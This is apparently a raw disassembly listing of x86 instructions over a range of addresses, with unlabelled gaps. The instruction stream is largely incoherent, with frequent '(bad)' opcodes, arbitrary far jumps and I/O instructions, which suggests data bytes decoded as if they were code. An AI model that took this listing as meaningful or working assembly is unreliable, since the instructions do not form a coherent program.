	...
  4278d4:	add    BYTE PTR [eax],al
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	stos   DWORD PTR es:[edi],eax
  4278e3:	mov    BYTE PTR [ebp-0x74],ch
  4278e6:	addr16 test al,0x1
  4278e9:	add    BYTE PTR [eax],al
  4278eb:	add    DWORD PTR [eax],eax
  4278ed:	add    BYTE PTR ds:0x7b048d65,dh
  4278f3:	lods   al,BYTE PTR ds:[esi]
  4278f4:	pop    eax
  4278f5:	outs   dx,BYTE PTR gs:[esi]
  4278f7:	shl    DWORD PTR [esp+edx*2-0x798a6f11],0x28
  4278ff:	sbb    BYTE PTR [edx+0x72e63a0a],dl
  427905:	mov    ebx,0x4bcac64b
  42790a:	xor    ebx,DWORD PTR [edi]
  42790c:	pop    ecx
  42790d:	aam    0x51
  42790f:	sar    esp,cl
  427911:	inc    edi
  427912:	mov    ah,0xf4
  427914:	add    BYTE PTR [ebp+0x6f],0x2e
  427918:	les    eax,FWORD PTR [edx]
  42791a:	and    al,0xe8
  42791c:	sub    al,0x4d
  42791e:	xchg   edi,eax
  42791f:	dec    edi
  427920:	pop    ebp
  427921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427922:	mov    bl,0xea
  427924:	sub    esi,DWORD PTR [esi]
  427926:	and    cl,BYTE PTR [ebx+eiz*2]
  427929:	sar    DWORD PTR [edi-0x48],cl
  42792c:	jp     0x42794d
  42792e:	xchg   BYTE PTR [eax+esi*4],bl
  427931:	sbb    eax,0x64bcad0f
  427936:	mov    ebx,0x894c49e8
  42793b:	and    esp,DWORD PTR [ebx+0xc73a1b1]
  427941:	mov    dh,0x82
  427943:	jl     0x42792d
  427945:	daa    
  427946:	sahf   
  427947:	fwait
  427948:	jmp    0x427957
  42794a:	pop    ebp
  42794b:	fisub  DWORD PTR [ebx+0x40391373]
  427951:	mov    cl,0x8e
  427953:	stos   BYTE PTR es:[edi],al
  427954:	cld    
  427955:	ret    0x8cf
  427958:	hlt    
  427959:	push   edx
  42795a:	or     esp,esi
  42795c:	sar    BYTE PTR [ebp*8-0x53943bb4],0xa0
  427964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427965:	mov    ecx,0x575a6e40
  42796a:	test   BYTE PTR ds:0xbe5dfad2,ah
  427970:	add    eax,0xbd34a39f
  427975:	add    al,0xfd
  427977:	adc    DWORD PTR [esi-0x28dad77c],ebp
  42797d:	pop    ss
  42797e:	retf   0x8665
  427981:	sbb    bh,BYTE PTR [edx-0x631b94f6]
  427987:	mov    BYTE PTR [edx],dh
  427989:	test   ecx,edx
  42798b:	inc    edi
  42798c:	mov    ah,0xc2
  42798e:	retf   0x913a
  427991:	add    al,0xb
  427993:	bound  ebp,QWORD PTR [ebp+0xd]
  427996:	test   DWORD PTR [edi-0x36a295c],0xe4c20969
  4279a0:	pop    esi
  4279a1:	push   eax
  4279a2:	test   eax,edx
  4279a4:	test   al,0x4a
  4279a6:	aaa    
  4279a7:	push   edi
  4279a8:	pop    eax
  4279a9:	out    dx,al
  4279aa:	adc    BYTE PTR ds:0x1ac1fab7,cl
  4279b0:	sbb    eax,0xa6c50ca0
  4279b5:	test   bl,bh
  4279b7:	jo     0x4279b7
  4279b9:	in     eax,0xb2
  4279bb:	sub    DWORD PTR [edx],esi
  4279bd:	and    ebp,DWORD PTR [eax]
  4279bf:	push   cs
  4279c0:	adc    al,BYTE PTR [ecx+ebp*8-0x1c87d306]
  4279c7:	test   BYTE PTR [esi],ah
  4279c9:	hlt    
  4279ca:	enter  0x29e7,0x6f
  4279ce:	outs   dx,DWORD PTR ds:[esi]
  4279cf:	cld    
  4279d0:	jo     0x427a2b
  4279d2:	leave  
  4279d3:	and    eax,0xd630b894
  4279d8:	fcom   DWORD PTR [esi+0x5f]
  4279db:	jnp    0x427a1c
  4279dd:	sbb    eax,0x1a216445
  4279e2:	dec    edi
  4279e3:	jge    0x427979
  4279e5:	dec    esi
  4279e6:	stc    
  4279e7:	xchg   edi,eax
  4279e8:	pop    es
  4279e9:	pop    edi
  4279ea:	scas   al,BYTE PTR es:[edi]
  4279eb:	ffree  st(4)
  4279ed:	aad    0x0
	...
  427a53:	add    BYTE PTR [eax],al
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx-0x1b24efec]
  427a66:	addr16 test eax,0x1000001
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	out    0xd8,al
  427a70:	sbb    al,0x1f
  427a72:	hlt    
  427a73:	lods   eax,DWORD PTR ds:[esi]
  427a74:	ret    
  427a75:	nop
  427a76:	stos   DWORD PTR es:[edi],eax
  427a77:	sbb    eax,DWORD PTR [edx]
  427a79:	icebp  
  427a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a7c:	or     BYTE PTR ds:0xa84dd080,cl
  427a82:	outs   dx,BYTE PTR ds:[esi]
  427a83:	loop   0x427a63
  427a85:	rcl    BYTE PTR [edi+0x4e],cl
  427a88:	jmp    0x2e48:0x811f9ea1
  427a8f:	or     dl,ah
  427a91:	pusha  
  427a92:	loope  0x427aa5
  427a94:	icebp  
  427a95:	add    BYTE PTR [eax+0x154cdcb8],ch
  427a9b:	mov    edi,0xdee6c3a3
  427aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aa1:	xchg   DWORD PTR [edi],edi
  427aa3:	fnsave [eax]
  427aa5:	stos   DWORD PTR es:[edi],eax
  427aa6:	dec    esi
  427aa7:	sub    al,0x56
  427aa9:	out    0xa1,eax
  427aab:	lods   eax,DWORD PTR ds:[esi]
  427aac:	int    0xda
  427aae:	inc    ebx
  427aaf:	mov    al,ds:0xa456929
  427ab4:	push   ebx
  427ab5:	push   0x172faefd
  427aba:	jo     0x427ac1
  427abc:	out    0x57,al
  427abe:	ficomp DWORD PTR [edx+0x55]
  427ac1:	push   ds
  427ac2:	mov    ah,0xf5
  427ac4:	lds    esp,FWORD PTR [ecx+ebx*4-0x5ebb9bfc]
  427acb:	xor    al,bh
  427acd:	jl     0x427ab7
  427acf:	jnp    0x427a71
  427ad1:	or     cl,BYTE PTR [ebx+0x59]
  427ad4:	stos   BYTE PTR es:[edi],al
  427ad5:	jecxz  0x427aa3
  427ad7:	in     al,0xf8
  427ad9:	mov    cl,0x8f
  427adb:	pop    ss
  427adc:	xchg   BYTE PTR [edi],dh
  427ade:	or     eax,0xa80c6c5f
  427ae3:	in     eax,0x2c
  427ae5:	bound  ecx,QWORD PTR [edx+ebx*8-0x3481f5e6]
  427aec:	dec    eax
  427aed:	mov    al,dh
  427aef:	mov    edx,ecx
  427af1:	std    
  427af2:	and    BYTE PTR [ebx],al
  427af4:	leave  
  427af5:	vpminub xmm4,xmm6,XMMWORD PTR [edx-0x5dccafe0]
  427afd:	pop    ds
  427afe:	jb     0x427acf
  427b00:	pop    ebx
  427b01:	popa   
  427b02:	adc    BYTE PTR [edi-0x3c],bl
  427b05:	mov    esi,0xd7c78a25
  427b0a:	les    esp,FWORD PTR [edi+0x42c71b98]
  427b10:	adc    DWORD PTR [edx-0x4c44c10b],edi
  427b16:	xchg   esi,eax
  427b17:	loopne 0x427ac7
  427b19:	dec    ecx
  427b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b1b:	cmc    
  427b1c:	(bad)  
  427b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b1e:	add    al,0x7f
  427b20:	xchg   edx,eax
  427b21:	and    BYTE PTR [edx+0x2298c97e],bh
  427b27:	jns    0x427b90
  427b29:	gs and eax,0x9be8758b
  427b2f:	or     ch,BYTE PTR [ebx+0x41]
  427b32:	inc    edx
  427b33:	pop    ecx
  427b34:	cmp    al,0xf7
  427b36:	in     eax,0xf6
  427b38:	in     eax,dx
  427b39:	jle    0x427b9d
  427b3b:	stos   DWORD PTR es:[edi],eax
  427b3c:	ret    0xf6e0
  427b3f:	ins    BYTE PTR es:[edi],dx
  427b40:	ja     0x427b1a
  427b42:	and    edi,DWORD PTR [edx+0xf3f36ee]
  427b48:	cli    
  427b49:	jg     0x427b5f
  427b4b:	fisub  DWORD PTR [esi]
  427b4d:	(bad)  
  427b4e:	pop    esp
  427b4f:	lods   eax,DWORD PTR ds:[esi]
  427b50:	add    BYTE PTR [edx-0x37],cl
  427b53:	mov    WORD PTR [edx-0x3f4cdcda],cs
  427b59:	push   eax
  427b5a:	xor    eax,edx
  427b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b5d:	push   ecx
  427b5e:	pop    ss
  427b5f:	outs   dx,BYTE PTR ds:[esi]
  427b60:	cmp    ch,ch
  427b62:	sub    eax,0xfb5d6f34
  427b67:	push   esp
  427b68:	add    eax,0xf96511cc
  427b6d:	push   esi
	...
  427bd6:	retf   0x528b
  427bd9:	jnp    0x427c2e
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	not    cl
  427be3:	mov    esi,0xaa673e42
  427be8:	add    DWORD PTR [eax],eax
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	lods   al,BYTE PTR ds:[esi]
  427bef:	xchg   edi,eax
  427bf0:	lock fs cs je 0x427c3d
  427bf5:	mov    al,0x8d
  427bf7:	inc    eax
  427bf8:	std    
  427bf9:	enter  0xa857,0x59
  427bfd:	xor    bh,BYTE PTR [esi-0x7ebe67e9]
  427c03:	sbb    BYTE PTR [edi],dl
  427c05:	imul   esi,DWORD PTR [ecx],0xffffffb2
  427c08:	pop    ecx
  427c09:	adc    al,0xf7
  427c0b:	xor    eax,0x322f3e88
  427c10:	push   ds
  427c11:	xchg   esi,eax
  427c12:	or     bl,dh
  427c14:	mov    al,ds:0x6f775f6a
  427c19:	add    al,0xa2
  427c1b:	retf   0x595b
  427c1e:	pop    esi
  427c1f:	(bad)  
  427c20:	fistp  WORD PTR [ecx]
  427c22:	ja     0x427bf7
  427c24:	loop   0x427be8
  427c26:	cmp    BYTE PTR [edi+0x3b],ch
  427c29:	dec    esi
  427c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c2b:	or     eax,0x17c8136
  427c30:	mov    edx,0x44f19f21
  427c35:	call   0x3466a43f
  427c3a:	pop    ecx
  427c3b:	in     al,0x1f
  427c3d:	jg     0x427bf4
  427c3f:	add    cl,al
  427c41:	sbb    edi,DWORD PTR [ebp-0x409586e8]
  427c47:	repnz shr bh,0xaa
  427c4b:	retf   
  427c4c:	ds mov ebx,0x7d9c4107
  427c52:	inc    eax
  427c53:	stc    
  427c54:	adc    eax,0x31286365
  427c59:	test   al,0x28
  427c5b:	and    esp,DWORD PTR [esi+ecx*8+0x59555b3]
  427c62:	test   al,0x51
  427c64:	int    0xb6
  427c66:	lock leave 
  427c68:	shr    BYTE PTR [esp+edi*2+0x7c3a46e],1
  427c6f:	hlt    
  427c70:	dec    eax
  427c71:	sub    BYTE PTR [ebx-0xe],dl
  427c74:	mov    esi,0xce815ef7
  427c79:	pop    ebx
  427c7a:	das    
  427c7b:	int3   
  427c7c:	pop    edi
  427c7d:	sahf   
  427c7e:	loop   0x427cbd
  427c80:	sub    bl,al
  427c82:	jne    0x427ca4
  427c84:	xor    edx,DWORD PTR [esi+0x2b]
  427c87:	shr    esi,cl
  427c89:	ret    
  427c8a:	sbb    esi,DWORD PTR [ecx-0x73fc1c26]
  427c90:	adc    al,0xb4
  427c92:	test   eax,0x78bffdfb
  427c97:	call   0x7c7e:0xa3b1de76
  427c9e:	lods   eax,DWORD PTR ds:[esi]
  427c9f:	or     DWORD PTR [edi+0x60cc36b4],edx
  427ca5:	or     al,0x6
  427ca7:	adc    al,0x58
  427ca9:	popf   
  427caa:	dec    edx
  427cab:	push   0x5a
  427cad:	lods   eax,DWORD PTR ds:[esi]
  427cae:	ins    DWORD PTR es:[edi],dx
  427caf:	into   
  427cb0:	jmp    0x56e5:0xd2648b7e
  427cb7:	sub    DWORD PTR [ebp-0xe],esi
  427cba:	xchg   edx,eax
  427cbb:	jp     0x427ca6
  427cbd:	imul   edi,esp,0x4dc4a8b2
  427cc3:	sbb    edi,DWORD PTR [esi+0x4f8040d2]
  427cc9:	adc    dl,BYTE PTR [edx-0x3e]
  427ccc:	ret    0x86e3
  427ccf:	cmp    ebp,esp
  427cd1:	inc    eax
  427cd2:	fs inc edi
  427cd4:	pop    esp
  427cd5:	cdq    
  427cd6:	inc    ebx
  427cd7:	lds    esi,FWORD PTR [edx]
  427cd9:	mov    cl,0x72
  427cdb:	push   esp
  427cdc:	aas    
  427cdd:	test   edi,ebp
  427cdf:	test   al,0xbe
  427ce1:	fild   WORD PTR [eax-0x5bbb0983]
  427ce7:	push   esp
  427ce8:	out    0x17,al
  427cea:	push   ds
  427ceb:	loopne 0x427c6f
  427ced:	enter  0x0,0x0
	...
  427d55:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0xcd415d44,ebx
  427d64:	shl    dh,cl
  427d66:	stos   DWORD PTR es:[di],eax
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	add    BYTE PTR [ecx],al
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	aad    0x3e
  427d70:	mov    eax,ds:0x84872daf
  427d75:	cli    
  427d76:	dec    ebx
  427d77:	in     al,dx
  427d78:	cmp    eax,0x14019643
  427d7d:	(bad)  
  427d7e:	adc    BYTE PTR [edi+0x37],bh
  427d81:	sbb    dh,al
  427d83:	jnp    0x427dde
  427d85:	pusha  
  427d86:	mov    WORD PTR [esi],fs
  427d88:	inc    ecx
  427d89:	les    eax,FWORD PTR [edx]
  427d8b:	inc    ebx
  427d8c:	ds call 0xdcb2:0xa3125c1e
  427d94:	xchg   esi,eax
  427d95:	xchg   esi,eax
  427d96:	jns    0x427d7c
  427d98:	into   
  427d99:	idiv   DWORD PTR [ecx+0x18]
  427d9c:	xor    eax,ebp
  427d9e:	push   esp
  427d9f:	test   DWORD PTR [ebx+0x191053c2],edi
  427da5:	repz xchg ebx,eax
  427da7:	ss std 
  427da9:	push   cs
  427daa:	or     DWORD PTR [edi-0x5f8adb88],0x9a92e2cc
  427db4:	push   0x12
  427db6:	(bad)  
  427dba:	cmp    ch,BYTE PTR [eax]
  427dbc:	mov    cs,WORD PTR [ecx]
  427dbe:	add    DWORD PTR [ebx],eax
  427dc0:	jne    0x427daa
  427dc2:	cmp    esp,DWORD PTR [eax]
  427dc4:	pop    esi
  427dc5:	ret    0x259d
  427dc8:	jns    0x427e27
  427dca:	in     eax,dx
  427dcb:	call   0x9bb0b05
  427dd0:	lock adc al,0x4e
  427dd3:	push   ss
  427dd4:	rcl    DWORD PTR [esi],0x9c
  427dd7:	mov    ecx,0x4abe781b
  427ddc:	mov    eax,0x19c3aad7
  427de1:	fadd   QWORD PTR [edx-0x67]
  427de4:	xchg   edi,eax
  427de5:	or     ebp,DWORD PTR ds:0x2d4c67b
  427deb:	dec    esi
  427dec:	js     0x427e61
  427dee:	push   edi
  427def:	rol    DWORD PTR [eax],cl
  427df1:	cmc    
  427df2:	add    al,cl
  427df4:	and    ebx,eax
  427df6:	sub    edi,esi
  427df8:	mov    al,0x35
  427dfa:	or     ah,ch
  427dfc:	stos   BYTE PTR es:[edi],al
  427dfd:	jle    0x427da9
  427dff:	stc    
  427e00:	pop    edi
  427e01:	shl    BYTE PTR [edi+0xb],0xae
  427e05:	mov    DWORD PTR [edx-0x54],esi
  427e08:	ficomp WORD PTR [ecx]
  427e0a:	add    edx,edi
  427e0c:	pop    esi
  427e0d:	adc    dl,BYTE PTR [ebx+eiz*2+0x1b]
  427e11:	mov    dl,0xf1
  427e13:	stos   DWORD PTR es:[edi],eax
  427e14:	gs ins DWORD PTR es:[edi],dx
  427e16:	and    al,0x5a
  427e18:	sub    DWORD PTR [ecx-0x11],edi
  427e1b:	js     0x427e66
  427e1d:	mov    eax,0x3d92ef26
  427e22:	inc    ecx
  427e23:	pop    eax
  427e24:	xor    BYTE PTR [ecx-0x19],0x7f
  427e28:	add    al,0x76
  427e2a:	jo     0x427e0e
  427e2c:	inc    edi
  427e2d:	addr16 dec ecx
  427e2f:	and    eax,0x68ed832
  427e34:	inc    esi
  427e35:	dec    esp
  427e36:	(bad)  
  427e37:	scas   al,BYTE PTR es:[edi]
  427e38:	mov    ebx,0xd6da2400
  427e3d:	clc    
  427e3e:	sbb    al,0xdf
  427e40:	fsubp  st(3),st
  427e42:	jae    0x427e08
  427e44:	in     al,0x9d
  427e46:	js     0x427dcf
  427e48:	addr16 inc edx
  427e4a:	stos   DWORD PTR es:[edi],eax
  427e4b:	xchg   ebp,eax
  427e4c:	fistp  QWORD PTR [ebx]
  427e4e:	pop    edi
  427e4f:	add    eax,0x5bbf19ba
  427e54:	scas   al,BYTE PTR es:[edi]
  427e55:	std    
  427e56:	mov    BYTE PTR [edi-0xa],bl
  427e59:	js     0x427ec2
  427e5b:	or     bl,BYTE PTR [eax+0xfcd6ce5]
  427e61:	mov    ah,0x0
  427e63:	dec    ecx
  427e64:	pop    ds
  427e65:	mov    dh,0x85
  427e67:	dec    edx
  427e68:	xor    al,0x84
  427e6a:	xchg   ecx,eax
  427e6b:	sub    al,BYTE PTR [ebx+0x3d]
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	mov    edx,0x670d53fc
  427ee7:	lods   al,BYTE PTR ds:[esi]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	mov    edi,0xd0a7e4c9
  427ef3:	scas   eax,DWORD PTR es:[edi]
  427ef4:	xor    BYTE PTR [eax+ebp*4],ch
  427ef7:	jo     0x427eed
  427ef9:	mov    esi,0x7189940d
  427efe:	and    esp,DWORD PTR [esi+0x2afde341]
  427f04:	pop    es
  427f05:	xchg   edi,eax
  427f06:	push   ds
  427f07:	dec    ecx
  427f08:	(bad)  
  427f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f0b:	(bad)  
  427f0d:	(bad)  
  427f0e:	cli    
  427f0f:	push   ss
  427f10:	and    ax,0x8323
  427f14:	test   al,0x43
  427f16:	jl     0x427ebf
  427f18:	mov    ebp,0xac048db8
  427f1d:	mov    al,ds:0x1bbeaea2
  427f22:	or     ch,bh
  427f24:	jne    0x427eb6
  427f26:	sti    
  427f27:	loop   0x427f48
  427f29:	cmp    DWORD PTR [edx+0x67],edx
  427f2c:	sti    
  427f2d:	mov    edi,0x8094052d
  427f32:	fstp   QWORD PTR [edx+0x2b]
  427f35:	(bad)  [ecx-0x4d]
  427f38:	dec    ecx
  427f39:	mov    al,0x2
  427f3b:	outs   dx,DWORD PTR ds:[esi]
  427f3c:	std    
  427f3d:	and    BYTE PTR [ecx+0x47],ch
  427f40:	loopne 0x427ee6
  427f42:	lahf   
  427f43:	xchg   ecx,eax
  427f44:	push   cs
  427f45:	je     0x427f44
  427f47:	test   BYTE PTR [ebx],0xe3
  427f4a:	arpl   cx,dx
  427f4c:	std    
  427f4d:	mov    bh,0x59
  427f4f:	aad    0x38
  427f51:	jge    0x427fb4
  427f53:	cmp    al,0x12
  427f55:	das    
  427f56:	mov    esp,0x66323bc
  427f5b:	int    0x53
  427f5d:	rcl    BYTE PTR [ecx],0x2c
  427f60:	outs   dx,BYTE PTR ds:[esi]
  427f61:	xchg   ecx,eax
  427f62:	sahf   
  427f63:	dec    ebx
  427f64:	out    dx,eax
  427f65:	sub    edx,DWORD PTR ds:0x2aa5426e
  427f6b:	dec    ebp
  427f6c:	ret    
  427f6d:	(bad)  
  427f6e:	std    
  427f6f:	stos   BYTE PTR es:[edi],al
  427f70:	and    ecx,DWORD PTR [esp+ebx*8-0x4da06a9b]
  427f77:	fdiv   st,st(1)
  427f79:	pop    edx
  427f7a:	mov    eax,0xe5c34110
  427f7f:	sub    ch,ch
  427f81:	(bad)  
  427f82:	jp     0x427fe0
  427f84:	mov    ah,BYTE PTR [edi+0x7f]
  427f87:	nop
  427f88:	adc    ch,cl
  427f8a:	call   0xb2b7:0xb2dd677a
  427f91:	add    DWORD PTR [ebx],edx
  427f93:	mov    al,BYTE PTR [eax]
  427f95:	ss mov esi,0x721fd84a
  427f9b:	xor    esp,eax
  427f9d:	pop    esi
  427f9e:	add    DWORD PTR [ecx],eax
  427fa0:	push   esp
  427fa1:	cmp    esp,DWORD PTR [edx-0xc30cff1]
  427fa7:	ja     0x427fec
  427fa9:	xchg   bh,ch
  427fab:	stos   BYTE PTR es:[edi],al
  427fac:	and    dh,BYTE PTR [eax-0x1d9ce54b]
  427fb2:	mov    edi,0xf2775f81
  427fb7:	push   edx
  427fb8:	sub    eax,0x1969d9db
  427fbd:	out    dx,eax
  427fbe:	pop    ebp
  427fbf:	ja     0x427fae
  427fc1:	dec    esi
  427fc2:	mov    ds:0xe103f5c4,eax
  427fc7:	(bad)  
  427fc9:	imul   DWORD PTR [ebx-0xc]
  427fcc:	fisubr DWORD PTR [ecx-0x45]
  427fcf:	repz pop ebp
  427fd1:	mov    WORD PTR [ebx-0x5ac5d8ee],ss
  427fd7:	psllq  mm0,QWORD PTR [esi+0x586adfbe]
  427fde:	mov    edx,0x1bb4cbd5
  427fe3:	mov    DWORD PTR [ebx+0x3d7f3b06],esi
  427fe9:	dec    eax
  427fea:	mov    ebp,0x43230a
	...
  428053:	add    BYTE PTR [eax],al
  428055:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	pop    ecx
  428063:	jp     0x428022
  428065:	push   0x67
  428067:	lods   eax,DWORD PTR ds:[esi]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	sbb    dl,BYTE PTR [ebx+0x4c]
  428071:	dec    eax
  428072:	(bad)  
  428073:	mov    eax,ss:0x66d2a00d
  428079:	inc    ebx
  42807a:	mov    ebx,0x54705195
  42807f:	retf   0x9cc1
  428082:	lahf   
  428083:	cmp    eax,0x7389a306
  428088:	iret   
  428089:	sub    BYTE PTR [ecx+0x13],0x8d
  42808d:	inc    ebx
  42808e:	and    eax,DWORD PTR [ebp-0x45]
  428091:	adc    BYTE PTR [ebp+0x25113d90],al
  428097:	add    DWORD PTR [esi],esp
  428099:	or     BYTE PTR [eax+0x49],ch
  42809c:	cmp    ebx,DWORD PTR [ebx-0x20ebd7e4]
  4280a2:	mov    eax,0xec0662e2
  4280a7:	lea    ebp,[edi-0x1b]
  4280aa:	dec    ebx
  4280ab:	xor    ah,ah
  4280ad:	push   edx
  4280ae:	daa    
  4280af:	inc    ebp
  4280b0:	mov    bh,0x98
  4280b2:	adc    DWORD PTR [ebx+0x31],esp
  4280b5:	call   0xe71b0091
  4280ba:	push   ebp
  4280bb:	mov    bl,0xda
  4280bd:	jge    0x4280d8
  4280bf:	xchg   DWORD PTR [esi+eiz*2],edi
  4280c2:	nop
  4280c3:	mov    ebx,0x116b2a7d
  4280c8:	dec    esp
  4280c9:	inc    esp
  4280ca:	push   edx
  4280cb:	mov    al,ds:0xa0497c31
  4280d0:	aaa    
  4280d1:	mov    esp,0x2d49df0b
  4280d6:	lods   eax,DWORD PTR ds:[esi]
  4280d7:	push   ecx
  4280d8:	inc    eax
  4280d9:	clc    
  4280da:	adc    ebx,DWORD PTR [edx+0x26]
  4280dd:	jl     0x4280b6
  4280df:	push   ss
  4280e0:	push   0x39
  4280e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e4:	xchg   BYTE PTR [edi+0x6321f0e8],bl
  4280ea:	dec    ecx
  4280eb:	inc    ecx
  4280ec:	sub    ch,BYTE PTR [ecx]
  4280ee:	test   al,0xb4
  4280f0:	and    bl,BYTE PTR [esi-0x3532f7b3]
  4280f6:	dec    ecx
  4280f7:	inc    ebp
  4280f8:	repnz in eax,dx
  4280fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280fb:	fcomp  DWORD PTR [ecx+0x7814ed7a]
  428101:	retf   
  428102:	cmp    al,0x68
  428104:	or     edi,DWORD PTR [esi-0x2a]
  428107:	(bad)  
  428108:	push   ebx
  428109:	ror    ecx,cl
  42810b:	and    BYTE PTR [esi],cl
  42810d:	sbb    DWORD PTR [ebp-0x1f],eax
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	sti    
  428112:	sub    ch,bh
  428114:	dec    edx
  428115:	lods   eax,DWORD PTR ds:[esi]
  428116:	hlt    
  428117:	xchg   ecx,eax
  428118:	(bad)  
  428119:	jmp    0x428193
  42811b:	or     BYTE PTR [edx+ecx*1],dh
  42811e:	xlat   BYTE PTR ds:[ebx]
  42811f:	(bad)  
  428120:	jp     0x428113
  428122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428123:	adc    DWORD PTR [ebx+edx*2-0x7f59c585],eax
  42812a:	and    ebp,DWORD PTR [edi+0xca4a781]
  428130:	test   ecx,edi
  428132:	adc    ecx,DWORD PTR [ebx+ebp*8-0x420f9a76]
  428139:	adc    BYTE PTR [ecx+ebx*8-0x3d],0x86
  42813e:	(bad)  
  42813f:	aas    
  428140:	xchg   esi,eax
  428141:	sahf   
  428142:	int    0x61
  428144:	add    ecx,DWORD PTR [eax]
  428146:	inc    esi
  428147:	push   eax
  428148:	sahf   
  428149:	fstp   DWORD PTR [ecx-0x38]
  42814c:	loop   0x428146
  42814e:	retf   0x9e81
  428151:	fdivr  QWORD PTR [esi]
  428153:	adc    ecx,DWORD PTR [edi+0x2ee0d590]
  428159:	jle    0x428179
  42815b:	ja     0x428165
  42815d:	mov    dl,0x3d
  42815f:	mov    dh,0x9f
  428161:	and    al,0xa8
  428163:	push   es
  428164:	mov    ds:0xcaa5b5fd,eax
  428169:	push   ebx
  42816a:	ficom  WORD PTR [esi]
  42816c:	setno  BYTE PTR [eax]
	...
  4281d3:	add    BYTE PTR [eax],al
  4281d5:	add    bh,bl
  4281d7:	out    dx,al
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	adc    BYTE PTR [edx],al
  4281e4:	mov    al,ds:0x1ae673f
  4281e9:	add    BYTE PTR [eax],al
  4281eb:	add    DWORD PTR [eax],eax
  4281ed:	add    BYTE PTR [ebp-0x62],cl
  4281f0:	mov    DWORD PTR [edi],edi
  4281f2:	test   BYTE PTR [eax-0x49745297],al
  4281f8:	outs   dx,DWORD PTR ds:[esi]
  4281f9:	int    0xf9
  4281fb:	jne    0x428272
  4281fd:	mov    dh,0x7f
  4281ff:	std    
  428200:	mov    edi,0x5db76dda
  428205:	jbe    0x4281fe
  428207:	loop   0x4281a6
  428209:	add    ebx,esi
  42820b:	ins    DWORD PTR es:[edi],dx
  42820c:	add    DWORD PTR [esi],esi
  42820e:	test   DWORD PTR ds:0xa9372b5d,0x99099de9
  428218:	mov    esi,0x45575f53
  42821d:	sub    ebx,DWORD PTR [ebx+0x77d16d72]
  428223:	dec    edx
  428224:	mov    ah,0x67
  428226:	test   DWORD PTR [ebx-0x23],eax
  428229:	xor    al,0xa9
  42822b:	xor    al,0x3b
  42822d:	in     al,0x8b
  42822f:	into   
  428230:	sbb    al,0xbe
  428232:	mov    bl,0x0
  428234:	add    edi,DWORD PTR [ebp*2+0x76b40d97]
  42823b:	das    
  42823c:	into   
  42823d:	jo     0x4282af
  42823f:	retf   0x2a23
  428242:	push   eax
  428243:	inc    ecx
  428244:	mov    ebx,0x396f1ae
  428249:	xchg   ebp,eax
  42824a:	jmp    0x42826e
  42824c:	(bad)  
  42824d:	cdq    
  42824e:	or     eax,0xca840d53
  428253:	loopne 0x428273
  428255:	loope  0x428218
  428257:	mov    cl,0x6b
  428259:	jge    0x42823c
  42825b:	imul   edi,DWORD PTR [ecx],0xfffffffb
  42825e:	leave  
  42825f:	adc    DWORD PTR [esi-0x1d],ebp
  428262:	sar    DWORD PTR [edi-0x17976791],1
  428268:	xchg   edx,eax
  428269:	icebp  
  42826a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42826b:	mov    al,ds:0xdcf9986b
  428270:	stc    
  428271:	fs in  al,dx
  428273:	sub    edi,DWORD PTR [ebx+0x52]
  428276:	xchg   edx,eax
  428277:	js     0x428262
  428279:	cmc    
  42827a:	fcomp  QWORD PTR [eax+0x52]
  42827d:	jb     0x428235
  42827f:	jae    0x42828f
  428281:	test   eax,0xea11b526
  428286:	sbb    ch,dl
  428288:	sub    al,0x6c
  42828a:	retf   0xc886
  42828d:	jno    0x428246
  42828f:	xor    BYTE PTR [edx-0x2c],0xde
  428293:	or     al,0xff
  428295:	hlt    
  428296:	(bad)  
  428298:	adc    BYTE PTR [esi+eiz*8-0x1c217f97],bh
  42829f:	popf   
  4282a0:	mov    al,0xd8
  4282a2:	lods   eax,DWORD PTR ds:[esi]
  4282a3:	add    ebp,ecx
  4282a5:	xchg   BYTE PTR [edi+0x7d],dh
  4282a8:	(bad)  
  4282a9:	test   al,0x68
  4282ab:	mov    BYTE PTR [edx-0x6a4dd11b],ch
